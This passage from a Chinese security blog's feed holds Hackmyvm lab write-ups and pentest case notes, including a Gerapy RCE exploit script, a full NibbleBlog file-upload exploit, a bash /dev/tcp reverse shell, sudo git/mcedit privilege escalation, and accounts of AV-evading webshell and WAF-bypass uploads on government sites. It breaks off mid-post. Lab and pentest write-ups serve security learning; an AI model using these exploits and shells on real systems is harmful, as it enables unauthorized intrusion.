json.loads(dict2)</span><br><span class="line">dict3 = json.loads(dict3)</span><br><span class="line"><span class="built_in">id</span> = dict3[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Found ID of the project: &quot;</span>, <span class="built_in">id</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#netcat listener</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Setting up a netcat listener&quot;</span>)</span><br><span class="line">listener = subprocess.Popen([<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;-nvlp&quot;</span>, self.localport])</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#exec the payload</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Executing reverse shell payload&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Watchout for shell! :)&quot;</span>)</span><br><span class="line">r5 = r.post(url + <span class="string">&quot;/api/project/&quot;</span> + <span class="built_in">str</span>(<span class="built_in">id</span>) + <span class="string">&quot;/parse&quot;</span>, data=payload, headers=auth_token, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">listener.wait()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (r5.status_code == <span class="number">200</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] It worked!&quot;</span>)</span><br><span class="line">listener.wait()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[!] Something went wrong!&quot;</span>)</span><br><span class="line">listener.terminate()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_args</span>():</span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Gerapy &lt; 0.9.8 - Remote Code Execution (RCE) (Authenticated)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>, dest=<span class="string">&quot;url&quot;</span>, required=<span class="literal">True</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target IP&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, dest=<span class="string">&quot;target_port&quot;</span>, required=<span class="literal">True</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target port&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;--lh&#x27;</span>, dest=<span class="string">&quot;localhost&quot;</span>, required=<span class="literal">True</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Listening IP&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-P&#x27;</span>, <span class="string">&#x27;--lp&#x27;</span>, dest=<span class="string">&quot;localport&quot;</span>, required=<span class="literal">True</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Listening port&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line">args = get_args()</span><br><span class="line">target_ip = args.url</span><br><span class="line">target_port = args.target_port</span><br><span class="line">localhost = args.localhost</span><br><span class="line">localport = args.localport</span><br><span class="line"></span><br><span class="line">exp = Exploit(target_ip, target_port, localhost, localport)</span><br><span class="line">exp.exploitation()</span><br></pre></td></tr></table></figure><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>修改exp中的第26、27行信息为创建的superuser的信息，然后执行exp即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py -t 192.168.56.9 -p 8001 -L 192.168.56.8 -P 9998</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329174647861.png" alt="image-20220329174647861"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329174033961.png" alt="image-20220329174033961"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Hackmyvm Machines </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackmyvm - Warrior WriteUp</title>
      <link href="/posts/2568939162/"/>
      <url>/posts/2568939162/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><p><strong>Machines Name：</strong>Hackmyvm - warrior</p><p><strong>Difficulty：</strong>easy</p><p><img src="https://hackmyvm.eu/img/m/machine.gif"></p><p>nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sS -vv -Pn 192.168.56.7</span><br></pre></td></tr></table></figure><p> <img src="https://typro-1304950244.file.myqcloud.com/image-20220329144747563.png" alt="image-20220329144747563"></p><p>可以看到nmap扫描结果中，robots.txt有些敏感的东西，去访问一下看看</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329145252151.png" alt="image-20220329145252151"></p><p>secret.txt</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329145323660.png" alt="image-20220329145323660"></p><p>user.txt</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329145354595.png" alt="image-20220329145354595"></p><p>internal.php</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329145413439.png" alt="image-20220329145413439"></p><p>只有以上三个文件能被访问，其中internal.php提示要更换MAC地址才能看到密码，那么更换一下MAC地址</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329151633966.png" alt="image-20220329151633966"></p><p>已有信息如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loco/0123456789ABCDEF/Zurviv0r1</span><br></pre></td></tr></table></figure><p>估计是连ssh。。。。。使用loco&#x2F;Zurviv0r1登录失败</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329152104869.png" alt="image-20220329152104869"></p><p>最后发现用户是bro</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329145413439.png" alt="image-20220329145413439"></p><p>使用bro&#x2F;Zurviv0r1登录成功</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329152240481.png" alt="image-20220329152240481"></p><h2 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h2><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329152453133.png" alt="image-20220329152453133"></p><h2 id="root-txt"><a href="#root-txt" class="headerlink" title="root.txt"></a>root.txt</h2><p>提权工具可以一把嗦的</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329152640003.png" alt="image-20220329152640003"></p><h2 id="手动提权"><a href="#手动提权" class="headerlink" title="手动提权"></a>手动提权</h2><p>task命令提权,task可以直接执行命令，并且调用root权限不需要密码认证</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329152839648.png" alt="image-20220329152839648"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220329153021588.png" alt="image-20220329153021588"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Hackmyvm Machines </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次源码泄露到后台文件上传绕过杀软 getshell</title>
      <link href="/posts/2744233938/"/>
      <url>/posts/2744233938/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某次授权渗透测试中遇到的一个gov资产的站，刚开始是发现了源码泄露，通过源码泄露找到了后台地址，然后通过后台弱口令登入后台，文件上传绕过杀软最终getshell。</p><h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><p>网站源码备份文件没删除，通过网站备份源码可以分析出网站整体的一个目录结构，以及一些可以尝试突破的功能点。</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220321164140889.png" alt="image-20220321164140889"></p><p>发现web.config配置文件，泄露了网站根目录绝对地址以及数据库sa用户的账户密码</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220321164711760.png" alt="image-20220321164711760"></p><p>通过分析网站源码找到网站后台路径</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220321164841399.png" alt="image-20220321164841399"></p><h2 id="后台弱口令"><a href="#后台弱口令" class="headerlink" title="后台弱口令"></a>后台弱口令</h2><p>admin&#x2F;111 登入后台</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220321165027494.png" alt="image-20220321165027494"></p><h2 id="文件上传绕过杀软getshell"><a href="#文件上传绕过杀软getshell" class="headerlink" title="文件上传绕过杀软getshell"></a>文件上传绕过杀软getshell</h2><p>存在上传点，但是有杀软，上传普通的webshell会被删除</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220321171432469.png" alt="image-20220321171432469"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220321170515306.png" alt="image-20220321170515306"></p><p>免杀webshell getshell</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220321170742232.png" alt="image-20220321170742232"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>存在sql注入 sqlserver 并支持堆叠注入 可以直接getshell</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220321171013581.png" alt="image-20220321171013581"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220321171140914.png" alt="image-20220321171140914"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220321171226410.png" alt="image-20220321171226410"></p><p>阿里云的机器，所以没有后续深入的必要了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 实战案例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次绕过云waf上传文件 getshell（一）</title>
      <link href="/posts/3930660148/"/>
      <url>/posts/3930660148/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><blockquote><p>这个案例来源于某次授权渗透测试。</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个目标是gov的资产，通过弱口令进入到系统之后找到上传点，但是存在waf，最后换行绕过。</p><h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><p>一个朴实无华的登录界面配上了朴实无华的登录密码 <strong>admin&#x2F;123456</strong></p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220321155637911.png" alt="image-20220321155637911"></p><p>进去大概是这样的,有大量人员信息。</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220321155805455.png" alt="image-20220321155805455"></p><p>其中一处找到一个上传点</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220321160043328.png" alt="image-20220321160043328"></p><p>抓包上传，虽然没有对文件后缀做过滤，可以直接上传aspx，但是上传webshell会遭到云waf拦截</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220321160251239.png" alt="image-20220321160251239"></p><h2 id="换行-绕过waf"><a href="#换行-绕过waf" class="headerlink" title="换行+: 绕过waf"></a>换行+: 绕过waf</h2><p>上传成功并返回路径</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220321160516202.png" alt="image-20220321160516202"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 实战案例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackmyvm - Blog WriteUp</title>
      <link href="/posts/2520060774/"/>
      <url>/posts/2520060774/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><p><strong>Machines Name：</strong>Hackmyvm - Blog</p><p><strong>Difficulty</strong>：easy</p><p><img src="https://hackmyvm.eu/img/m/machine.gif"></p><p>nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sS -vv -Pn 192.168.56.6</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220307162642944.png" alt="image-20220307162642944"></p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220307162753144.png" alt="image-20220307162753144"></p><p>目录爆破发现&#x2F;my_weblog目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -w ./directory-list-2.3-medium.txt -u http://192.168.56.6</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220307171801363.png" alt="image-20220307171801363"></p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220307172058273.png" alt="image-20220307172058273"></p><p>二级目录扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w ./directory-list-2.3-medium.txt -u http://192.168.56.6/my_weblog/ -x php</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220307172711862.png" alt="image-20220307172711862"></p><p>其它没什么东西，好像只能从admin.php后台页面入手</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220307172853265.png" alt="image-20220307172853265"></p><p>google搜索了一下nibbleblog这个东西，发现存在一个任意文件上传的漏洞，但是需要账户密码，</p><p>Exploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Your PHP Payload goes into local file nibble.txt</span></span><br><span class="line"><span class="comment"># msfvenom -p php/reverse_perl --format raw -o nibble.txt LHOST=ATTACKER LPORT=ATTACKER</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Loosely ported from the NibbleBlog File Upload MSF Module</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Twitter: @a7kemc73</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">nibbleUsername = <span class="string">&quot;&lt;USERNAME&gt;&quot;</span></span><br><span class="line">nibblePassword = <span class="string">&quot;&lt;PASSWORD&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">nibbleURL = <span class="string">&quot;http://127.0.0.1/nibbleblog/&quot;</span></span><br><span class="line">loginURL = nibbleURL + <span class="string">&quot;admin.php&quot;</span></span><br><span class="line">uploadURL = nibbleURL + <span class="string">&quot;admin.php?controller=plugins&amp;action=config&amp;plugin=my_image&quot;</span></span><br><span class="line">exploitURL = nibbleURL + <span class="string">&quot;content/private/plugins/my_image/image.php&quot;</span></span><br><span class="line"></span><br><span class="line">body=<span class="string">&#x27;&lt;?php echo &quot;He4dTr1p is pwning...&lt;br&gt;&quot;;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;nibble.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> payload:</span><br><span class="line">body=body + payload.read()</span><br><span class="line">body=body + <span class="string">&#x27;echo &quot;Check for shell!&quot;; ?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> web:</span><br><span class="line"><span class="comment"># Getting login session and cookies</span></span><br><span class="line">loginGetResp = web.get(loginURL)</span><br><span class="line">loginPostResp = web.post(loginURL, data=&#123;<span class="string">&#x27;username&#x27;</span>:nibbleUsername,<span class="string">&#x27;password&#x27;</span>:nibblePassword&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG &gt; <span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[-] LOGIN RESPONSE: &#x27;</span> + <span class="built_in">str</span>(loginPostResp.status_code) + <span class="string">&quot; &quot;</span> + <span class="built_in">str</span>(loginPostResp.reason)</span><br><span class="line"><span class="keyword">if</span> DEBUG &gt; <span class="number">1</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;\n&#x27;</span> + loginPostResp.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;Incorrect username or password.&#x27;</span> <span class="keyword">in</span> loginPostResp.text:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[!] Login Failed.&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment"># Performing File Upload</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+] Login Successful.&#x27;</span></span><br><span class="line">uploadPostResp = web.post(uploadURL, data=&#123;<span class="string">&#x27;plugin&#x27;</span>:<span class="string">&#x27;my_image&#x27;</span>,<span class="string">&#x27;title&#x27;</span>:<span class="string">&#x27;My image&#x27;</span>,<span class="string">&#x27;position&#x27;</span>:<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;caption&#x27;</span>:<span class="string">&#x27;He4dTr1p&#x27;</span>,<span class="string">&#x27;image_resize&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;image_width&#x27;</span>:<span class="string">&#x27;230&#x27;</span>,<span class="string">&#x27;image_height&#x27;</span>:<span class="string">&#x27;200&#x27;</span>,<span class="string">&#x27;image_option&#x27;</span>:<span class="string">&#x27;auto&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;image&#x27;</span>: (<span class="string">&#x27;nibbles.php&#x27;</span>, body, <span class="string">&#x27;application/x-php&#x27;</span>)&#125;, timeout=<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG &gt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;&lt;b&gt;Warning&lt;/b&gt;&#x27;</span> <span class="keyword">in</span> uploadPostResp.text:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[-] Upload likely successful.&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[-] Upload likely failed.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG &gt; <span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[-] UPLOAD RESPONSE: &#x27;</span> + <span class="built_in">str</span>(uploadPostResp.status_code) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(uploadPostResp.reason)</span><br><span class="line"><span class="keyword">if</span> DEBUG &gt; <span class="number">1</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;\n&#x27;</span> + uploadPostResp.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># Executing Upload</span></span><br><span class="line">exploitResp = web.get(exploitURL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> exploitResp.status_code == <span class="number">200</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+] Exploit launched, check for shell.&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[!] Exploit failed.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG &gt; <span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[-] EXPLOIT RESPONSE: &#x27;</span> + <span class="built_in">str</span>(exploitResp.status_code) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(exploitResp.reason)</span><br><span class="line"><span class="keyword">if</span> DEBUG &gt; <span class="number">1</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;\n&#x27;</span> + exploitResp.text</span><br></pre></td></tr></table></figure><p>后台密码掏出大字典跑就是了，我机器内存给的巨低，这里跑起来很很很很很慢，所以去看了wp作弊了一下下，而且爆破这个东西，我巨讨厌</p><p>意思一下，密码是kisses</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220308175051211.png" alt="image-20220308175051211"></p><p>同时根据这个exp可以知道漏洞存在位置在admin.php?controller&#x3D;plugins&amp;action&#x3D;config&amp;plugin&#x3D;my_image</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220308173226649.png" alt="image-20220308173226649"></p><h2 id="任意文件上传getshell"><a href="#任意文件上传getshell" class="headerlink" title="任意文件上传getshell"></a>任意文件上传getshell</h2><p>冰蝎传马连接</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220308173320081.png" alt="image-20220308173320081"></p><p>冰蝎环境太拉垮了，把shell反弹出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.56.5/9999 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220308173453707.png" alt="image-20220308173453707"></p><h2 id="提权至admin"><a href="#提权至admin" class="headerlink" title="提权至admin"></a>提权至admin</h2><p>sudo -l 发现admin用户不需要认证可以执行git命令，那么可以使用git提权到admin用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u admin git -p <span class="built_in">help</span> config</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220308173632625.png" alt="image-20220308173632625"></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220308173725227.png" alt="image-20220308173725227"></p><h2 id="提权至root"><a href="#提权至root" class="headerlink" title="提权至root"></a>提权至root</h2><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220308173753885.png" alt="image-20220308173753885"></p><p>mcedit编辑器提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/mcedit</span><br></pre></td></tr></table></figure><p>Invoke shell</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220308174107037.png" alt="image-20220308174107037"></p><p>Enjoy root shell!!</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220308174131862.png" alt="image-20220308174131862"></p><h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220308174222576.png" alt="image-20220308174222576"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Hackmyvm Machines </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackmyvm - Hotel WriteUp</title>
      <link href="/posts/877236972/"/>
      <url>/posts/877236972/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><p><strong>Machines Name：</strong>Hackmyvm - Hotel</p><p><strong>Difficulty：</strong>easy</p><p><img src="https://hackmyvm.eu/img/m/machine.gif"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -vv -Pn 192.168.189.153</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220304150752273.png" alt="image-20220304150752273"></p><p>根据网站banner可以知道这是一个叫HotelDruid的什么东西，全是英文也看不太懂</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220304150735414.png" alt="image-20220304150735414"></p><p>直接google大法来一波，一发入魂？</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220304150938061.png" alt="image-20220304150938061"></p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span 